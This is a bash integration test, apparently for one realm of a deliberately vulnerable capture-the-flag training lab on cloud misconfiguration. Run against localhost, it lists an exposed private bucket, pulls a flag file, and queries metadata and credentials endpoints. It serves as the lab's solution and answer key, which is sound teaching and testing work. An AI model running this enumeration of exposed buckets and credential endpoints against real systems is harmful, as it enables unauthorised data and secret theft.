#!/bin/bash
# Integration test for Alfheim - Cloud Misconfiguration
set -e
REALM="alfheim"
BASE_URL="http://localhost:8080/realms/${REALM}"
echo "========================================"
echo "Testing ALFHEIM Realm"
echo "A02:2025 - Security Misconfiguration"
echo "========================================"
echo ""
echo "Step 1: Health check..."
curl -s "${BASE_URL}/health" | grep -q '"status":"ok"' && echo "✓ Health OK" || exit 1
echo "Step 2: List buckets (IAM misconfiguration)..."
BUCKETS=$(curl -s "${BASE_URL}/api/buckets")
echo "$BUCKETS" | grep -q 'alfheim-secrets' && echo "✓ Private bucket exposed" || exit 1
echo "Step 3: List objects in private bucket..."
OBJECTS=$(curl -s "${BASE_URL}/api/bucket/alfheim-secrets/objects")
echo "$OBJECTS" | grep -q 'flag.txt' && echo "✓ Objects listed" || exit 1
echo "Step 4: Access flag file..."
FLAG_OBJ=$(curl -s "${BASE_URL}/api/object/alfheim-secrets/flag.txt")
FLAG=$(echo "$FLAG_OBJ" | grep -oP 'YGGDRASIL\{ALFHEIM:[a-f0-9-]+\}')
if [ -z "$FLAG" ]; then echo "✗ Flag not found"; exit 1; fi
echo "✓ Flag extracted: $FLAG"
echo "Step 5: Access metadata endpoint..."
curl -s "${BASE_URL}/.well-known/metadata" | grep -q '"role":"admin-service-role"' && echo "✓ Metadata exposed" || exit 1
echo "Step 6: Access credentials endpoint..."
CREDS=$(curl -s "${BASE_URL}/.well-known/credentials")
echo "$CREDS" | grep -q 'YGGDRASIL' && echo "✓ Credentials with flag exposed" || exit 1
echo ""
echo "========================================"
echo "✓ All ALFHEIM tests passed!"
echo "========================================"
echo "Flag: $FLAG"
